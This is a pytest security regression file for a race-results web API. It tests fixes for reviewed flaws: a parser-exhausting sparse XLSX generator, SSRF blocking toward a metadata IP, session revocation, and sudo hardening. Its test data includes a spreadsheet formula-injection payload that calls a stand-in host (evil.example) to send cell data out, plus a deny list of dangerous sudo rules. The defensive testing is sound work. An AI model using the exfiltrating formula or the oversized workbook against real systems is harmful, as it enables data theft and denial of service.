"""Two more outside reviews (September 2026), each finding tried here. Companion to
test_security_account.py and test_security_audit.py."""

import importlib
import socket
import time
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from api import auth, db, rate_limit, security, server_stats
from ingestion import reader

app_module = importlib.import_module("api.app")
client = TestClient(app_module.app)
elsewhere = TestClient(app_module.app, client=("203.0.113.9", 50000))
pytestmark = pytest.mark.usefixtures("clean_state")

PASSWORD = "a-long-test-password-1"
REPO = Path(__file__).resolve().parents[2]


def _account(email, *, verified=True):
    client.cookies.clear()
    client.post("/auth/register", json={"email": email, "password": PASSWORD, "accept_terms": True})
    if verified:
        with db.get_connection() as connection:
            connection.execute("UPDATE organizers SET email_verified = TRUE WHERE email = %s", (email,))
    return _sign_in(email)


def _sign_in(email, password=PASSWORD):
    token = client.post("/auth/login", json={"email": email, "password": password}).json()["access_token"]
    client.cookies.clear()
    return {"Authorization": f"Bearer {token}", "X-OTRI-Client": "test"}


def _race(headers, name="10K"):
    event = client.post("/events", json={"event_name": f"Event {name}", "event_date": "2027-01-01"}, headers=headers).json()
    return client.post(f"/events/{event['event_id']}/races", json={"course_name": name, "distance_km": 10, "elevation_gain_m": 100}, headers=headers).json()["race_id"]


def _upload(headers, race_id, rows):
    body = "Rank,Time,Last name,First name,Gender,Year of birth,Nationality\n" + "".join(f"{i},1:0{i}:00,{last},{first},M,{year},{nat}\n" for i, (last, first, year, nat) in enumerate(rows, start=1))
    answer = client.post(f"/races/{race_id}/results", files={"file": ("r.csv", body.encode(), "text/csv")}, headers=headers)
    assert answer.status_code == 200 and answer.json()["is_valid"], answer.text
    return answer


def _runner(family_name):
    with db.get_connection() as connection:
        return connection.execute("SELECT runner_id, birth_year, nationality FROM runners WHERE family_name = %s", (family_name,)).fetchall()


# --- a workbook that claims the whole grid ---------------------------------------------------


def _sparse_workbook(path, last_row, last_column, dimension):
    sheet = (
        '<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        f'<dimension ref="{dimension}"/><sheetData>'
        '<row r="1"><c r="A1" t="inlineStr"><is><t>Rank</t></is></c><c r="B1" t="inlineStr"><is><t>Time</t></is></c>'
        f'<c r="{last_column}1" t="inlineStr"><is><t>x</t></is></c></row>'
        f'<row r="{last_row}"><c r="A{last_row}" t="inlineStr"><is><t>1</t></is></c></row></sheetData></worksheet>'
    )
    rel = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>')
        archive.writestr("_rels/.rels", f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{rel}/officeDocument" Target="xl/workbook.xml"/></Relationships>')
        archive.writestr("xl/workbook.xml", f'<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{rel}"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>')
        archive.writestr("xl/_rels/workbook.xml.rels", f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{rel}/worksheet" Target="worksheets/sheet1.xml"/></Relationships>')
        archive.writestr("xl/worksheets/sheet1.xml", sheet)


def test_a_tiny_workbook_that_claims_the_whole_grid_is_refused_at_once(tmp_path):
    """1.5 KB, two cells with anything in them: 14 seconds of a core at 60,000 rows by 16,384
    columns, minutes at the full grid, and the public scorer takes workbooks from anyone."""
    path = tmp_path / "grid.xlsx"
    _sparse_workbook(path, 1_048_576, "XFD", "A1:XFD1048576")
    assert path.stat().st_size < 5_000
    start = time.perf_counter()
    with pytest.raises(ValueError, match="more than 50000 rows"):
        reader._read_xlsx(path)
    assert time.perf_counter() - start < 5

    # Inside the row limit the claimed width is not believed either: read, quickly, and narrow.
    _sparse_workbook(path, 40_000, "XFD", "A1:XFD40000")
    start = time.perf_counter()
    rows = reader._read_xlsx(path)
    assert time.perf_counter() - start < 5
    assert len(rows) == 2 and max(len(row) for row in rows) <= reader.MAX_XLSX_COLUMNS


# --- the sign-in code and the email log ------------------------------------------------------


def test_a_sign_in_code_is_not_kept_in_the_email_log():
    headers = _account("code@example.com")
    assert client.post("/auth/2fa/email/start", json={"password": PASSWORD}, headers=headers).status_code == 200
    client.post("/auth/login", json={"email": "code@example.com", "password": PASSWORD})
    with db.get_connection() as connection:
        subjects = [row["subject"] for row in connection.execute("SELECT subject FROM email_log WHERE to_email = 'code@example.com'").fetchall()]
    assert "Your OTRI sign-in code" in subjects
    assert not [subject for subject in subjects if any(character.isdigit() for character in subject)], subjects
    export = client.get("/auth/export", headers=headers).text
    assert "is your OTRI sign-in code" not in export


# --- who is an admin -------------------------------------------------------------------------


def test_an_address_taken_off_the_admin_list_is_no_admin_any_more(monkeypatch):
    monkeypatch.setattr(app_module, "_ADMIN_EMAILS", {"staff@example.com"})
    _account("staff@example.com")
    headers = _sign_in("staff@example.com")
    assert client.get("/admin/overview", headers=headers).status_code == 200

    monkeypatch.setattr(app_module, "_ADMIN_EMAILS", set())  # the operator edits the list and restarts
    assert client.get("/admin/overview", headers=headers).status_code == 403, "the open session, at once"
    assert db.keep_admins(set()) == 1, "and the flag on the account goes at the restart"
    again = client.post("/auth/login", json={"email": "staff@example.com", "password": PASSWORD}).json()
    assert again["is_admin"] is False
    assert client.get("/admin/overview", headers={"Authorization": f"Bearer {again['access_token']}"}).status_code == 403

    # A flag somebody set by hand counts for nothing without the list.
    with db.get_connection() as connection:
        connection.execute("UPDATE organizers SET is_admin = TRUE WHERE email = 'staff@example.com'")
    assert client.get("/admin/overview", headers={"Authorization": f"Bearer {again['access_token']}"}).status_code == 403


def test_the_newsletter_export_holds_no_formulas(monkeypatch):
    monkeypatch.setattr(app_module, "_ADMIN_EMAILS", {"boss@example.com"})
    _account("boss@example.com")
    admin = _sign_in("boss@example.com")
    member = _account("member@example.com")
    assert client.patch("/auth/profile", json={"display_name": "=1+1", "organization": '=HYPERLINK("https://evil.example/?"&A2,"x")', "marketing_opt_in": True}, headers=member).status_code == 200
    lines = client.get("/admin/newsletter.csv", headers=admin).text.splitlines()
    row = next(line for line in lines if line.startswith("member@example.com"))
    assert ",'=1+1," in row and "'=HYPERLINK" in row and ",=" not in row


# --- sessions --------------------------------------------------------------------------------


def test_turning_two_factor_on_signs_out_every_other_session():
    for method in ("totp", "email"):
        email = f"on-{method}@example.com"
        intruder = _account(email)
        owner = _sign_in(email)
        if method == "totp":
            secret = client.post("/auth/2fa/totp/setup", json={"password": PASSWORD}, headers=owner).json()["secret"]
            enabled = client.post("/auth/2fa/totp/enable", json={"code": security.totp_now(secret)}, headers=owner)
        else:
            client.post("/auth/2fa/email/start", json={"password": PASSWORD}, headers=owner)
            with db.get_connection() as connection:
                connection.execute("UPDATE organizers SET email_code_hash = %s WHERE email = %s", (security.hash_code("135790"), email))
            enabled = client.post("/auth/2fa/email/enable", json={"code": "135790"}, headers=owner)
        assert enabled.status_code == 200 and len(enabled.json()["codes"]) == 10
        assert client.get("/auth/me", headers=intruder).status_code == 401, "whoever was in is out"
        fresh = {"Authorization": f"Bearer {enabled.json()['access_token']}"}
        assert client.get("/auth/me", headers=fresh).json()["two_factor"]["enabled"] is True, "this device carries on"


def test_signing_out_ends_the_token_not_only_the_cookie():
    headers = _account("bye@example.com")
    other_device = _sign_in("bye@example.com")
    assert client.post("/auth/logout", headers=headers).status_code == 200
    assert client.get("/auth/me", headers=headers).status_code == 401, "the token copied before signing out is dead"
    assert client.get("/auth/me", headers=other_device).status_code == 200, "one session, not all of them"
    assert client.get("/auth/me", headers=_sign_in("bye@example.com")).status_code == 200, "signing in again, the same second, works"

    # Another site can make a browser send the cookie, not the client header: that ends nothing.
    web = TestClient(app_module.app)
    web.post("/auth/login", json={"email": "bye@example.com", "password": PASSWORD}, headers={"X-OTRI-Client": "web"})
    cookie = web.cookies.get("otri_session")
    web.post("/auth/logout")
    kept = TestClient(app_module.app)
    kept.cookies.set("otri_session", cookie)
    assert kept.get("/auth/me").status_code == 200
    with db.get_connection() as connection:
        stored = [row["token"] for row in connection.execute("SELECT token FROM revoked_tokens").fetchall()]
    assert stored and all(len(token) == 64 for token in stored), "digests, not tokens"


def test_a_reset_lets_the_owner_of_a_locked_account_with_two_factor_back_in():
    headers = _account("locked-2fa@example.com")
    secret = client.post("/auth/2fa/totp/setup", json={"password": PASSWORD}, headers=headers).json()["secret"]
    assert client.post("/auth/2fa/totp/enable", json={"code": security.totp_now(secret)}, headers=headers).status_code == 200
    for _ in range(rate_limit.LOCKOUT_FAILURES_ANY_SOURCE):
        rate_limit.record_login_failure("locked-2fa@example.com", "198.51.100.1")
    assert client.post("/auth/login", json={"email": "locked-2fa@example.com", "password": PASSWORD}).status_code == 429
    _organizer, token = auth.create_password_reset_token("locked-2fa@example.com")
    assert client.post("/auth/reset-password", json={"token": token, "new_password": "a-brand-new-password-9"}).json()["requires_2fa"] is True
    login = client.post("/auth/login", json={"email": "locked-2fa@example.com", "password": "a-brand-new-password-9"})
    assert login.status_code == 200 and login.json()["requires_2fa"] is True
    assert client.post("/auth/login/2fa", json={"challenge": login.json()["challenge"], "code": security.totp_now(secret)}).status_code == 200


def test_failure_rows_for_addresses_nobody_has_do_not_stay_for_ever():
    rate_limit.record_login_failure("nobody-1@example.com", "198.51.100.1")
    rate_limit.record_failure("2fa|still-locked@example.com", threshold=1, duration=timedelta(days=3))
    long_ago = datetime.now(timezone.utc) - timedelta(days=2)
    with db.get_connection() as connection:
        connection.execute("UPDATE login_failures SET first_failure_at = %s", (long_ago,))
        rate_limit.prune_failures(connection, datetime.now(timezone.utc))
        left = [row["email"] for row in connection.execute("SELECT email FROM login_failures").fetchall()]
    assert left == ["2fa|still-locked@example.com"], "a lock still running is kept"


# --- the certificate check -------------------------------------------------------------------


def test_the_certificate_check_does_not_connect_into_the_private_network(monkeypatch):
    asked = []
    monkeypatch.setattr(socket, "create_connection", lambda address, **_: asked.append(address) or (_ for _ in ()).throw(OSError("no network in tests")))
    for host, address in (("metadata.example", "169.254.169.254"), ("db.internal", "10.0.0.5"), ("loop.example", "127.0.0.1")):
        monkeypatch.setattr(socket, "getaddrinfo", lambda *_a, _address=address, **_k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (_address, 443))])
        assert server_stats.tls_expiry(host) == {"available": False}
    assert asked == []
    monkeypatch.setattr(socket, "getaddrinfo", lambda *_a, **_k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))])
    server_stats.tls_expiry("api.example.org")
    assert asked == [("93.184.216.34", 443)], "a public name is checked, at the address that was looked at"


# --- runners ---------------------------------------------------------------------------------


def test_a_draft_does_not_write_into_a_runner_the_public_sees():
    organizer = _account("real-organizer@example.com")
    published = _race(organizer, "Published 10K")
    _upload(organizer, published, [("Publicrunner", "Pat", "", "")])
    assert client.post(f"/races/{published}/publish", headers=organizer).status_code == 200
    (before,) = _runner("Publicrunner")
    assert before["birth_year"] is None and before["nationality"] is None

    stranger = _account("stranger@example.com", verified=False)  # no confirmed address, nothing published
    draft = _race(stranger, "Draft")
    _upload(stranger, draft, [("Publicrunner", "Pat", "1950", "THA")])
    (after,) = _runner("Publicrunner")
    assert (after["birth_year"], after["nationality"]) == (None, None), "the private upload changed nothing anyone sees"

    # The organizer's own next race says it in public, under a confirmed address: that completes the runner.
    second = _race(organizer, "Second 10K")
    _upload(organizer, second, [("Publicrunner", "Pat", "1988", "FRA")])
    assert _runner("Publicrunner")[0]["birth_year"] is None, "still a draft"
    assert client.post(f"/races/{second}/publish", headers=organizer).status_code == 200
    (completed,) = _runner("Publicrunner")
    assert (completed["birth_year"], completed["nationality"]) == (1988, "FRA")


def test_runners_go_with_their_last_result():
    """One race, its results replaced again and again with new names, grew the runners table
    outside every quota; so did deleted races and closed accounts."""
    headers = _account("churn@example.com")
    race_id = _race(headers)
    _upload(headers, race_id, [(f"First{i}", "A", "", "") for i in range(1, 6)])
    _upload(headers, race_id, [(f"Second{i}", "B", "", "") for i in range(1, 4)])
    with db.get_connection() as connection:
        names = {row["family_name"][:5] for row in connection.execute("SELECT family_name FROM runners WHERE family_name LIKE 'First%%' OR family_name LIKE 'Secon%%'").fetchall()}
        assert names == {"Secon"}, "the first file's runners went with its results"
    other = _race(headers, "21K")
    _upload(headers, other, [("Second1", "B", "", ""), ("Only21", "C", "", "")])
    assert client.delete(f"/races/{race_id}", headers=headers).status_code in (200, 204)
    with db.get_connection() as connection:
        left = sorted(row["family_name"] for row in connection.execute("SELECT family_name FROM runners WHERE family_name LIKE 'Secon%%' OR family_name = 'Only21'").fetchall())
    assert left == ["Only21", "Second1"], "a runner with a result elsewhere stays"
    assert client.request("DELETE", "/auth/account", json={"password": PASSWORD}, headers=headers).status_code == 200
    with db.get_connection() as connection:
        assert connection.execute("SELECT COUNT(*) AS n FROM runners WHERE family_name IN ('Second1', 'Only21')").fetchone()["n"] == 0


# --- the deploy user's sudo ------------------------------------------------------------------


def test_the_deploy_user_may_not_write_anything_root_acts_on():
    rules = (REPO / "scripts" / "deploy" / "09-harden-sudo.sh").read_text(encoding="utf-8")
    sudoers = rules[rules.index("cat >\"${TMP}\" <<EOF") : rules.index("\nEOF\n")]
    for forbidden in ("/usr/bin/tee", "daemon-reload", "systemctl enable", "/etc/systemd", "NOPASSWD: ALL"):
        assert forbidden not in sudoers, forbidden
    deploy = (REPO / "scripts" / "deploy" / "02-deploy-app.sh").read_text(encoding="utf-8")
    assert "sudo tee" not in deploy and "10-install-service.sh" in deploy
